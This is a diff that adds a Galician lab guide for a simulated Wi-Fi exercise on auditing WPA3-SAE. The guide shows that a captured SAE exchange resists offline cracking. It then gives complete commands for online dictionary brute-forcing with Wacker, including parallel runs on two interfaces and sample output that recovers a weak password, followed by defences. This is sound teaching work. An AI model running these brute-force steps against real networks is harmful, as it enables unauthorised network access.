@@ -1,0 +1,331 @@
+<!doctype html><html lang="gl"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Guía da práctica 3.1 — Auditoría WPA3-SAE</title><style>
+:root{color-scheme:light dark}body{font:16px/1.58 system-ui,Arial;margin:0;background:#f7f9fb;color:#1c2e3d}.wrap{max-width:940px;margin:0 auto;padding:22px 28px 70px}a{color:#1460a0}header{position:sticky;top:0;background:#12334d;color:#fff;padding:12px 26px}header a{color:#fff}article{background:white;border-radius:16px;padding:25px 36px;box-shadow:0 4px 20px #18364f11}h1{font-size:1.7rem;line-height:1.25}h2{font-size:1.35rem;margin-top:2rem;border-bottom:1px solid #d7e0e7;padding-bottom:.4rem}h3{font-size:1.1rem}pre{padding:14px 18px;background:#11283a;color:#e4f5ff;overflow:auto;border-radius:9px;white-space:pre}pre code{font:13px/1.5 ui-monospace,Consolas,monospace}p code,li code{background:#e8eff5;padding:2px 4px;border-radius:4px}table{border-collapse:collapse;display:block;overflow:auto}td,th{border:1px solid #d4e0ea;padding:8px;text-align:left}img{max-width:100%;height:auto}blockquote{border-left:4px solid #14a3b8;padding:2px 12px;background:#eff7f9}.notice{padding:10px 15px;border-left:4px solid #16a5bd;background:#eff9fc;border-radius:6px}.notice.warning{border-color:#db7e26;background:#fff7eb}.notice strong{display:block} @media(max-width:640px){.wrap{padding:12px}article{padding:15px}} </style><header><a href="../index.html">← Volver ao laboratorio interactivo</a> · Guía docente validada</header><main class="wrap"><article><h1>Guía da práctica 3.1 — Auditoría WPA3-SAE</h1>
+<div class="notice warning"><strong>Consideracións técnicas antes dos comandos</strong>
+<p>O escenario <code>wpa3_sae</code> utiliza <code>phy0_wlan0</code> para o AP e <code>phy1_wlan1</code> para o cliente; as interfaces libres de observación deben comprobarse con <code>iw dev</code>. SAE negocia Commit/Confirm; unha autenticación posterior de tipo Open System pode deberse á reutilización dunha PMKSA almacenada en caché e <strong>non demostra automaticamente unha degradación a WPA2</strong>. Os resultados descritos no PDF son referencia docente; comproba os rexistros e a captura desta execución.</p>
+</div>
+<div class="notice important"><strong>Baseada na práctica [3-Taller-HE-Practica-WiFi-1.pdf](https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/3-Taller-HE-Practica-WiFi-1.pdf){:target=&quot;_blank&quot;}</strong>
+</div>
+<h2>1. Contexto e Obxectivos</h2>
+<p>Nesta práctica exploraremos a seguridade de <strong>WPA3-SAE (Simultaneous Authentication of Equals)</strong>. Demostraremos que, a diferenza de WPA2-PSK, WPA3-SAE é <strong>resistente a ataques de dicionario offline</strong>: mesmo capturando o intercambio SAE con <code>airodump-ng</code>, non é posíbel recuperar o contrasinal con <code>aircrack-ng</code>.</p>
+<hr />
+<h2>2. Correspondencia entre as consolas do PDF e as terminais de Kali</h2>
+<p>No <strong><a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/3-Taller-HE-Practica-WiFi-1.pdf">PDF da práctica</a>{:target=&quot;_blank&quot;}</strong>, o AP, o cliente e o atacante prepáranse manualmente en consolas independentes. Neste laboratorio, <code>wifilabctl</code> xa inicia o AP e o cliente, polo que as terminais empréganse para controlar, observar e auditar eses compoñentes.</p>
+<p>| Terminal en Kali | Correspondencia co PDF | Función nesta práctica | Interface e namespace | Páxinas do PDF |
+|---|---|---|---|---|
+| <strong>Terminal 1 — AP e control</strong> | Consola 1 | Iniciar o escenario e consultar os rexistros do AP | <code>wlan0</code> · <code>phy0_wlan0</code> | 5–7 |
+| <strong>Terminal 2 — Cliente</strong> | Consola 2 | Comprobar a conexión e provocar unha nova autenticación SAE | <code>wlan1</code> · <code>phy1_wlan1</code> | 7–8 |
+| <strong>Terminal 3 — Atacante e captura</strong> | Consola 3 | Activar modo monitor, capturar e analizar con Aircrack-ng | <code>wlan2</code> · namespace global | 7–8 |
+| <strong>Terminal 4 — Wacker</strong> | Consola 4 | Executar Wacker en <code>wlan2</code> e, opcionalmente, en paralelo coa terminal 3 | <code>wlan2</code> · namespace global · modo <em>managed</em> | 9–11 |</p>
+<div class="notice note"><strong>Organización das terminais</strong>
+<p>Abre <strong>tres terminais gráficas distintas</strong> ao comezo. Deixa a <strong>terminal 3</strong> capturando mentres utilizas a <strong>terminal 2</strong> para reconectar o cliente; a <strong>terminal 1</strong> queda dispoñible para consultar os logs. A <strong>terminal 4</strong> só se abre na parte de Wacker. Non é preciso abrir unha shell interactiva dentro dos <em>namespaces</em> nin empregar <code>exit</code>.</p>
+</div>
+<p>Os namespaces deste escenario chámanse <code>phy0_wlan0</code> e <code>phy1_wlan1</code>. As interfaces <code>wlan2</code> e <code>wlan3</code> quedan no namespace global para o atacante. Confirma sempre a situación con <code>sudo wifilabctl status</code> e <code>iw dev</code>.</p>
+<hr />
+<h2>3. Preparación do escenario — Terminal 1 (PDF: Consola 1, páxinas 5–7)</h2>
+<p>Na <strong>terminal 1</strong> da sesión gráfica de Kali:</p>
+<pre><code class="language-bash">sudo wifilabctl up wpa3_sae
+sudo wifilabctl status
+</code></pre>
+<p>A saída de <code>status</code> debe mostrar o AP <code>wlan0</code> en <code>phy0_wlan0</code>, o cliente <code>wlan1</code> en <code>phy1_wlan1</code> e as interfaces <code>wlan2</code> e <code>wlan3</code> dispoñibles globalmente. Non é necesario volver crear os <em>namespaces</em> nin executar manualmente <code>hostapd</code>: son operacións realizadas polo controlador.</p>
+<p>Para consultar o estado do AP sen entrar no seu <em>namespace</em>:</p>
+<pre><code class="language-bash">sudo ip netns exec phy0_wlan0 iw dev wlan0 info
+sudo tail -n 25 /home/kali/wifiLab/run/wpa3_sae/hostapd.log
+</code></pre>
+<hr />
+<h2>4. Captura SAE e auditoría — Terminais 2 e 3</h2>
+<h3>4.1. Preparar a terminal 3 do atacante (PDF: Consola 3, páxinas 7–8)</h3>
+<p>Na <strong>terminal 3</strong> (namespace global) comproba as interfaces e activa o modo monitor:</p>
+<pre><code class="language-bash">iw dev
+sudo airmon-ng start wlan2
+iw dev
+</code></pre>
+<p>A interface de captura chamarase normalmente <strong><code>wlan2mon</code></strong>. Se <code>airmon-ng</code> amosa avisos sobre procesos en conflito, <strong>non executes <code>airmon-ng check kill</code></strong>: podería deter <code>hostapd</code> e <code>wpa_supplicant</code>, que manteñen o laboratorio funcionando. Se o nome da interface difire, usa o mostrado por <code>iw dev</code>.</p>
+<h3>4.2. Recoñecer a rede (PDF: Consola 3, páxina 8)</h3>
+<p>Na <strong>terminal 3</strong>:</p>
+<pre><code class="language-bash">sudo airodump-ng wlan2mon
+</code></pre>
+<p>Localiza <code>EMPRESA-XYZ</code> e comproba a columna de autenticación, que debe indicar <strong>SAE</strong> (a presentación exacta de <code>ENC</code> depende da versión de Aircrack-ng). Anota o BSSID e a canle; despois preme <strong><code>Ctrl+C</code></strong> para deter o escaneo.</p>
+<h3>4.3. Iniciar a captura de SAE (PDF: Consola 3, páxina 8)</h3>
+<p>Na <strong>terminal 3</strong>, inicia unha captura na canle do AP (no laboratorio, normalmente a 6):</p>
+<pre><code class="language-bash">mkdir -p capturas
+sudo airodump-ng wlan2mon -c 6 -w capturas/cap
+</code></pre>
+<p><strong>Deixa esta terminal capturando</strong>. Non introduzas nela os comandos de reconexión; para iso empregaremos a terminal 2. O nome do ficheiro xerado pode ser <code>cap-01.cap</code>, <code>cap-02.cap</code>, etc., segundo as capturas existentes.</p>
+<h3>4.4. Comprobar a conexión inicial — Terminal 2 (PDF: Consola 2, páxina 7)</h3>
+<p>Na <strong>terminal 2</strong>:</p>
+<pre><code class="language-bash">sudo ip netns exec phy1_wlan1 iw dev wlan1 link
+</code></pre>
+<p>Deberá aparecer a rede <code>EMPRESA-XYZ</code>. Ao utilizar <code>ip netns exec</code> directamente para cada orde non abandonamos a shell de Kali.</p>
+<h3>4.5. Reconectar o cliente sen pechar a terminal (PDF: Consola 2, páxina 8)</h3>
+<p><strong>Mantén <code>airodump-ng</code> capturando na terminal 3.</strong> Na <strong>terminal 2</strong>, executa cada comando directamente, <strong>sen <code>sudo ip netns exec ... bash</code> e sen <code>exit</code></strong>:</p>
+<pre><code class="language-bash"># Desconectar o cliente xa xestionado por wpa_supplicant
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 disconnect
+
+# Limpar a caché PMKSA para provocar unha nova autenticación SAE
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 pmksa_flush
+sleep 2
+
+# Conectar de novo e comprobar a asociación
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect
+sleep 8
+sudo ip netns exec phy1_wlan1 iw dev wlan1 link
+</code></pre>
+<p><code>wpa_cli</code> utiliza o <code>wpa_supplicant</code> existente: <strong>non o mata nin inicia outro en paralelo</strong>. A primeira e terceira ordes deberían devolver <code>OK</code>; a última debe mostrar o cliente asociado. Se <code>wpa_cli</code> informa de que non pode comunicarse co proceso, detén a proba e revisa os logs antes de continuar.</p>
+<p>Na <strong>terminal 1</strong>, comproba o rexistro do AP:</p>
+<pre><code class="language-bash">sudo tail -n 35 /home/kali/wifiLab/run/wpa3_sae/hostapd.log
+</code></pre>
+<p>Busca evidencias de autenticación SAE, asociación e finalización do intercambio de claves. Os enderezos MAC e o texto exacto dos eventos poden variar. A existencia de tramas EAPOL <strong>non significa</strong> que o handshake sexa vulnerable a un ataque offline de dicionario.</p>
+<h3>4.6. Auditar a captura — Terminal 3 (PDF: Consola 3, páxina 8)</h3>
+<p><strong>Volve á terminal 3</strong> (a de <code>airodump-ng</code>), deixa transcorrer uns segundos tras a reconexión e detén a captura con <strong><code>Ctrl+C</code></strong>. En SAE pode non aparecer a indicación literal <code>WPA handshake:</code> que é habitual en WPA2-PSK; <strong>non agardes indefinidamente por esa cabeceira</strong>.</p>
+<p>Na <strong>mesma terminal 3</strong> identifica a captura máis recente, prepara o dicionario e executa Aircrack-ng:</p>
+<pre><code class="language-bash"># Seleccionar o ficheiro de captura máis recente
+CAP=$(ls -t capturas/cap-*.cap | head -n 1)
+echo &quot;$CAP&quot;
+
+# Rockyou pode estar xa descomprimido na VM
+if [ -f /usr/share/wordlists/rockyou.txt ]; then
+    WORDLIST=/usr/share/wordlists/rockyou.txt
+else
+    gzip -cd /usr/share/wordlists/rockyou.txt.gz &gt; /tmp/rockyou.txt
+    WORDLIST=/tmp/rockyou.txt
+fi
+
+sudo aircrack-ng &quot;$CAP&quot; -w &quot;$WORDLIST&quot;
+</code></pre>
+<p>O PDF (páxina 8) amosa como exemplo de saída:</p>
+<pre><code class="language-text">Unsupported key version 0 encountered.
+May be WPA3 - not yet supported.
+Aborted
+</code></pre>
+<p>A mensaxe exacta pode variar segundo a versión de Aircrack-ng e as tramas que se capturen. O resultado que se pretende comprobar é que <strong>a captura dun intercambio WPA3-SAE non permite verificar contrasinais offline como acontece cun handshake WPA2-PSK</strong>. O intercambio SAE de autenticación e o posterior <em>4-way handshake</em> son fases diferentes.</p>
+<hr />
+<h2>5. Análise: Por que WPA3-SAE é Resistente</h2>
+<p>| Característica              | WPA2-PSK       | WPA3-SAE             |
+|-----------------------------|----------------|----------------------|
+| Ataque dicionario offline   | ✗ Posíbel      | ✅ Non posíbel        |
+| Deautenticación maliciosa   | ✗ Posíbel      | ✅ PMF impídeo        |
+| Forward Secrecy             | ✗ Non          | ✅ Si                 |
+| Crack con aircrack-ng       | ✗ Posíbel      | ✅ Non soportado      |</p>
+<hr />
+<h2>6. Wacker: Ataque por Forza Bruta Online contra WPA3-SAE</h2>
+<blockquote>
+<p>💡 <strong>Mensaxe clave:</strong> WPA3-SAE elimina os ataques offline de dicionario (non se pode crackear o handshake capturado). Porén, <strong>si é posible un ataque online de forza bruta directa</strong> contra o AP. A única defensa real é a <strong>fortaleza do contrasinal</strong>.</p>
+</blockquote>
+<hr />
+<h3>6.1. Por que WPA3-SAE non é vulnerable a ataques offline... pero si a ataques online</h3>
+<p>En WPA2-PSK, o ataque captura o 4-way handshake e crackéao offline sen límite de velocidade. <strong>WPA3-SAE bloquea este vector</strong> mediante o protocolo Dragonfly: cada sesión deriva claves únicas (Forward Secrecy) que non permiten reconstruír o contrasinal desde o tráfico capturado.</p>
+<p>Porén, <strong>o protocolo SAE require que o AP responda a cada intento de autenticación</strong>. Isto permite un ataque diferente: <strong>probar contrasinais directamente contra o AP en tempo real</strong>.</p>
+<p>| Característica             | WPA2-PSK offline       | WPA3-SAE online (wacker)          |
+|----------------------------|:----------------------:|:---------------------------------:|
+| Captura de handshake       | ✔ Necesaria            | ✗ Non necesaria                   |
+| Cracking offline           | ✔ Sen límite           | ✗ Imposible (Forward Secrecy)     |
+| Tentativas por segundo     | Millóns (GPU)          | ~80-150 (limitado pola rede)      |
+| Detectable polo AP/IDS     | ✗ Invisible            | ✔ Visible (tráfico SAE continuo)  |
+| Éxito depende de           | GPU + wordlist         | <strong>Fortaleza do contrasinal</strong>      |</p>
+<hr />
+<h3>6.2. Wacker: ferramenta de dicionario online para WPA3-SAE</h3>
+<p><strong><a href="https://github.com/blunderbuss-wctf/wacker">Wacker</a>{:target=&quot;_blank&quot;}</strong> é un cracker de dicionario para WPA3-SAE que usa o <strong>interface de control de <code>wpa_supplicant</code></strong> para lanzar intentos de autenticación SAE directamente contra o AP, sen capturar ningún handshake previo.</p>
+<p>Mecanismo de funcionamento:</p>
+<ol>
+<li>Wacker lanza o seu propio <code>wpa_supplicant</code> parcheado</li>
+<li>Para cada palabra da wordlist, tenta autenticarse co AP mediante SAE Commit/Confirm</li>
+<li>O AP responde con éxito ou fallo</li>
+<li>Wacker interpreta a resposta e pasa á seguinte palabra</li>
+</ol>
+<p><strong>Características clave:</strong></p>
+<ul>
+<li>✔ Non require captura de tráfico previa — ataque puro online</li>
+<li>✔ Compatible con <code>mac80211_hwsim</code> — funciona no noso laboratorio</li>
+<li>✔ Paralelizable con múltiples interfaces e fragmentos da wordlist</li>
+<li>⚠️ Lento (~80-150 palabras/segundo) fronte a cracking offline (millóns/segundo con GPU)</li>
+<li>⚠️ Detectable: o AP ve tráfico SAE anómalo continuo</li>
+<li>⚠️ Vulnerable a bloqueo por MAC: o AP pode blacklistear a MAC atacante</li>
+</ul>
+<hr />
+<h3>6.3. Instalación de wacker (Terminal 3; PDF: Consola 3, páxinas 9–10)</h3>
+<p>Para esta práctica mantense <strong><code>wpa3_sae</code></strong>, xa iniciado no apartado 3. Non cambies a <code>wpa3_sae_vulnerable</code>: ese escenario está reservado para a práctica 3.3 e nel <code>wlan2</code> non queda dispoñible no namespace global. Wacker require compilar o seu propio <code>wpa_supplicant</code> parcheado. Executa estes comandos na <strong>terminal 3</strong>, no namespace global (PDF: Consola 3, páxinas 9–10):</p>
+<pre><code class="language-bash">sudo su -
+
+# Instalar dependencias de compilación
+apt-get install -y pkg-config libnl-3-dev gcc libssl-dev libnl-genl-3-dev git
+
+# Clonar wacker
+cd /opt
+git clone https://github.com/blunderbuss-wctf/wacker.git
+cd wacker
+
+# Aplicar o patch ao wpa_supplicant incluído no repositorio
+git apply wpa_supplicant.patch
+
+# Compilar wpa_supplicant parcheado (pode tardar varios minutos)
+cp defconfig wpa_supplicant-2.10/wpa_supplicant/.config
+cd wpa_supplicant-2.10/wpa_supplicant
+make -j4
+
+# Verificar compilación
+ls -lh wpa_supplicant
+# -rwxr-xr-x 1 root root ~13M ... wpa_supplicant
+</code></pre>
+<blockquote>
+<p>⚠️ Este <code>wpa_supplicant</code> compilado úsao wacker internamente — <strong>non substitúe</strong> o do sistema.</p>
+</blockquote>
+<hr />
+<h3>6.4. Identificar o obxectivo (Terminal 3; PDF: Consola 3, páxina 10)</h3>
+<p>Wacker comproba contrasinais <strong>en liña</strong> contra o <strong>AP WPA3-SAE do laboratorio</strong> (<code>wlan0</code>). As interfaces <code>wlan2</code> e <code>wlan3</code> están dispoñibles no namespace global para o atacante: ningunha delas é un AP falso.</p>
+<pre><code class="language-bash"># Obter BSSID do AP lexítimo WPA3 (wlan0) e a súa frecuencia
+sudo ip netns exec phy0_wlan0 iw dev wlan0 info
+
+# Saída esperada:
+# Interface wlan0
+#   addr EA:18:30:AA:C3:48      ← BSSID_AP (anota este valor)
+#   ssid EMPRESA-XYZ
+#   channel 6 (2437 MHz)        ← FREQ = 2437
+
+# Gardar para uso posterior
+BSSID_AP=&quot;EA:18:30:AA:C3:48&quot;   # substituír polo BSSID real
+FREQ=2437
+</code></pre>
+<blockquote>
+<p>💡 O BSSID real pode diferir en cada arranque do laboratorio. Verificar sempre con <code>iw dev wlan0 info</code> ou <code>wifilabctl status</code>.</p>
+</blockquote>
+<hr />
+<h3>6.5. Executar wacker (Terminal 4; PDF: Consola 4, páxina 10)</h3>
+<p>Abrir <strong>outra terminal</strong>. Wacker usará <code>wlan2</code> (interface libre no namespace global — a mesma usada para <code>airodump-ng</code> nas seccións anteriores, pero agora en modo managed):</p>
+<pre><code class="language-bash">sudo su -
+cd /opt/wacker
+
+# Asegurarse de que wlan2 NON está en modo monitor (parar airmon-ng se estivese activo)
+airmon-ng stop wlan2mon 2&gt;/dev/null || true
+ip link set wlan2 down
+iw dev wlan2 set type managed
+ip link set wlan2 up
+
+# Descomprimir wordlist
+gunzip -kf /usr/share/wordlists/rockyou.txt.gz
+
+# Lanzar wacker (substituír BSSID_AP e FREQ polos valores reais)
+python3 wacker.py   --wordlist /usr/share/wordlists/rockyou.txt   --interface wlan2   --bssid EA:18:30:AA:C3:48   --ssid EMPRESA-XYZ   --freq 2437
+</code></pre>
+<p><strong>Saída esperada durante o ataque:</strong></p>
+<pre><code>Start time: 20 Feb 2026 10:15:32
+Starting wpa_supplicant...
+    1532 / 14344391   words (0.01%) :  82.3 words/sec : 0.005 hours lapsed :  48.4 hours to exhaust
+    3847 / 14344391   words (0.03%) :  79.8 words/sec : 0.013 hours lapsed :  49.9 hours to exhaust
+    ...
+Found the password: 'spongebob19'
+
+Stop time: 20 Feb 2026 10:19:47
+</code></pre>
+<blockquote>
+<p>⚠️ Con <code>rockyou.txt</code> e o contrasinal <code>spongebob19</code> (débil, presente na wordlist), wacker atopa o contrasinal en <strong>minutos</strong>. Con un contrasinal forte de 20+ caracteres aleatorios, o ataque tardaría séculos.</p>
+</blockquote>
+<hr />
+<h3>6.6. Paralelización de Wacker con dúas interfaces (opcional; PDF: páxina 11)</h3>
+<p>No <strong>PDF de referencia, páxina 11</strong>, esta ampliación repártese entre as consolas 3 e 4. No laboratorio automatizado utilízanse as mesmas terminais: <strong>terminal 3 con <code>wlan3</code></strong> e <strong>terminal 4 con <code>wlan2</code></strong>. Non se necesita unha quinta terminal.</p>
+<p>O escenario <code>wpa3_sae</code> dispón de <strong>catro radios simuladas</strong>: <code>wlan0</code> para o AP, <code>wlan1</code> para o cliente e <strong><code>wlan2</code> e <code>wlan3</code> libres para o atacante</strong>. Esta sección é opcional: realízaa despois de rematar a proba individual do apartado 6.5 e deter esa instancia de Wacker con <code>Ctrl+C</code>.</p>
+<h4>Preparación da segunda radio e do dicionario — Terminal 3</h4>
+<p>Na <strong>terminal 3</strong>, unha vez finalizada a captura do apartado 4, comproba que ambas interfaces están no <em>namespace</em> global:</p>
+<pre><code class="language-bash">sudo wifilabctl status
+iw dev
+</code></pre>
+<p>Se <code>wlan2</code> aínda figura como <code>wlan2mon</code>, a terminal 4 deberá restaurala a modo <em>managed</em> como se explicou no apartado 6.5. Para a <strong>segunda interface</strong> <code>wlan3</code>, executa:</p>
+<pre><code class="language-bash">sudo ip link set wlan3 down
+sudo iw dev wlan3 set type managed
+sudo ip link set wlan3 up
+sudo iw dev wlan3 info
+</code></pre>
+<p>O tipo esperado é <code>managed</code>. <strong>Non utilices <code>airmon-ng check kill</code></strong>, porque pode deter procesos do AP e do cliente.</p>
+<p>Divide Rockyou en dous ficheiros distintos. O comando <code>split</code> de GNU/Linux divide o dicionario por liñas e deixa os fragmentos claramente identificados, sen modificar o orixinal:</p>
+<pre><code class="language-bash">sudo split -n l/2 -d -a 1 \
+  --additional-suffix=.txt \
+  /usr/share/wordlists/rockyou.txt \
+  /tmp/wifilab-wacker-parte-
+
+ls -lh /tmp/wifilab-wacker-parte-{0,1}.txt
+</code></pre>
+<p>Os dous ficheiros resultantes son <code>/tmp/wifilab-wacker-parte-0.txt</code> e <code>/tmp/wifilab-wacker-parte-1.txt</code>. Cada instancia probará un fragmento diferente.</p>
+<h4>Primeiro atacante — Terminal 4 (<code>wlan2</code>)</h4>
+<p>Coa radio <code>wlan2</code> xa restaurada a modo <em>managed</em> no apartado 6.5, obtén o BSSID real e executa Wacker co primeiro fragmento:</p>
+<pre><code class="language-bash">cd /opt/wacker
+BSSID_AP=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1==&quot;addr&quot; {print $2; exit}')
+echo &quot;AP WPA3-SAE: $BSSID_AP&quot;
+sudo python3 wacker.py \
+  --wordlist /tmp/wifilab-wacker-parte-0.txt \
+  --interface wlan2 \
+  --bssid &quot;$BSSID_AP&quot; \
+  --ssid EMPRESA-XYZ \
+  --freq 2437
+</code></pre>
+<p><strong>Deixa esta terminal traballando</strong> mentres abres a terminal 3.</p>
+<h4>Segundo atacante — Terminal 3 (<code>wlan3</code>)</h4>
+<pre><code class="language-bash">cd /opt/wacker
+BSSID_AP=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1==&quot;addr&quot; {print $2; exit}')
+echo &quot;AP WPA3-SAE: $BSSID_AP&quot;
+sudo python3 wacker.py \
+  --wordlist /tmp/wifilab-wacker-parte-1.txt \
+  --interface wlan3 \
+  --bssid &quot;$BSSID_AP&quot; \
+  --ssid EMPRESA-XYZ \
+  --freq 2437
+</code></pre>
+<p>Comproba nos dous terminais que Wacker inicia o seu <code>wpa_supplicant</code> de traballo e realiza intentos co fragmento correspondente. Se unha das instancias localiza a clave de proba, detén a outra con <code>Ctrl+C</code>.</p>
+<div class="notice note"><strong>Interpretación e alcance desta proba</strong>
+<p>A existencia de dúas radios e dous procesos <strong>non garante</strong> que o AP admita ambos de forma simultánea nin que a velocidade se duplique. O procedemento está preparado para reproducir a ampliación do PDF, pero a <strong>execución concorrente debe validarse experimentalmente na VM</strong> antes de dar este apartado por completado. Non é necesario para validar o resto da práctica 3.1.</p>
+</div>
+<div class="notice tip"><strong>Wrapper `wacker` (opcional)</strong>
+<p>Para executar Wacker desde calquera directorio pódese crear este script <strong>unha soa vez</strong>. Debe conservar a primeira liña <code>#!/usr/bin/env bash</code>:</p>
+<pre><code class="language-bash">sudo tee /usr/local/bin/wacker &gt;/dev/null &lt;&lt;'WSCRIPT'
+#!/usr/bin/env bash
+cd /opt/wacker
+exec python3 ./wacker.py &quot;$@&quot;
+WSCRIPT
+sudo chmod 755 /usr/local/bin/wacker
+</code></pre>
+<p>As terminais 3 e 4 poden utilizar <code>wacker</code> en lugar de <code>sudo python3 wacker.py</code>, mantendo os demais argumentos. O comando débese executar con <code>sudo</code> porque o proceso necesita controlar interfaces Wi-Fi:</p>
+<pre><code class="language-bash">sudo wacker --wordlist /tmp/wifilab-wacker-parte-0.txt --interface wlan2 --bssid &quot;$BSSID_AP&quot; --ssid EMPRESA-XYZ --freq 2437
+sudo wacker --wordlist /tmp/wifilab-wacker-parte-1.txt --interface wlan3 --bssid &quot;$BSSID_AP&quot; --ssid EMPRESA-XYZ --freq 2437
+</code></pre>
+<p>Cada liña execútase na súa terminal correspondente e presupón que nela se obtivo previamente o BSSID real, como se explica no apartado 6.6.</p>
+</div>
+<hr />
+<h3>6.7. Monitorización e reanudación</h3>
+<p>Wacker garda logs en <code>/tmp/wacker/</code>:</p>
+<pre><code class="language-bash"># Listar ficheiros de log (Terminal 4 despois da execución de Wacker)
+ls -lh /tmp/wacker/
+# wlan2             → socket de control wpa_supplicant
+# wlan2.conf        → configuración wpa_supplicant para wacker
+# wlan2.pid         → PID do proceso wpa_supplicant
+# wlan2_wacker.log  → log detallado (só con --debug)
+
+# Reanudar desde unha palabra concreta (se o ataque foi interrompido)
+python3 wacker.py   --wordlist /usr/share/wordlists/rockyou.txt   --interface wlan2   --bssid EA:18:30:AA:C3:48   --ssid EMPRESA-XYZ   --freq 2437   --start sponge
+# Continúa desde a primeira palabra que comeza por &quot;sponge&quot;
+</code></pre>
+<hr />
+<h3>6.8. Conclusión: a seguridade de WPA3-SAE depende do contrasinal</h3>
+<p>A práctica demostrou empiricamente que:</p>
+<ul>
+<li><code>airodump-ng</code> captura o intercambio SAE pero <strong>non contén datos crackeables</strong>.</li>
+<li><code>aircrack-ng</code> falla explicitamente: <code>May be WPA3 - not yet supported</code>.</li>
+</ul>
+<p>Na <strong><a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/3-Taller-HE-Practica-WiFi-2.pdf">Práctica 3.2</a>{:target=&quot;_blank&quot;}</strong> estudaremos KRACK e as condicións nas que pode producirse unha reinstalación de claves. Non se debe atribuír a PMF unha inmunidade absoluta fronte a KRACK. A práctica 3.2 dispón do seu propio procedemento e evidencias.</p>
+<pre><code>SEGURIDADE WPA3-SAE = f(fortaleza do contrasinal)
+</code></pre>
+<p>| Tipo de contrasinal             | Exemplo                   | Tempo estimado (wacker, 1 NIC) |
+|---------------------------------|---------------------------|--------------------------------|
+| Palabra de dicionario           | <code>spongebob19</code>             | <strong>Minutos</strong> (en rockyou)       |
+| Frase curta predecible          | <code>minomerodecasa</code>          | <strong>Horas-días</strong> (wordlists específicas) |
+| 12 caracteres mixtos            | <code>X9k!mP2@qR5n</code>           | <strong>Anos</strong> (fóra de wordlists)   |
+| 20+ caracteres aleatorios       | <code>v7#Kp!2mNxQ8@wLjR4s</code>   | <strong>Séculos</strong> (imposible na práctica) |</p>
+<p><strong>Defensas contra wacker:</strong></p>
+<ul>
+<li>✔ <strong>Contrasinal ≥ 20 caracteres</strong> aleatorios — a única defensa realmente efectiva</li>
+<li>✔ <strong><code>sae_anti_clogging_threshold=5</code></strong> en <code>hostapd.conf</code> — limita a taxa de intentos SAE</li>
+<li>✔ <strong>Monitorización de intentos SAE fallidos</strong> con IDS/SIEM — wacker xera moito ruído visible</li>
+<li>✔ <strong>WPA3-Enterprise (EAP-TLS)</strong> — elimina completamente o risco de forza bruta ao contrasinal compartido</li>
+</ul>
+<hr />
+<h2>7. Limpeza</h2>
+<pre><code class="language-bash">sudo wifilabctl reset
+</code></pre>
+</article><p>Fonte: Markdown orixinal de <code>20261121_docs.he-ud2.zip</code>. O procedemento debe executarse exclusivamente no laboratorio docente autorizado.</p></main></html>
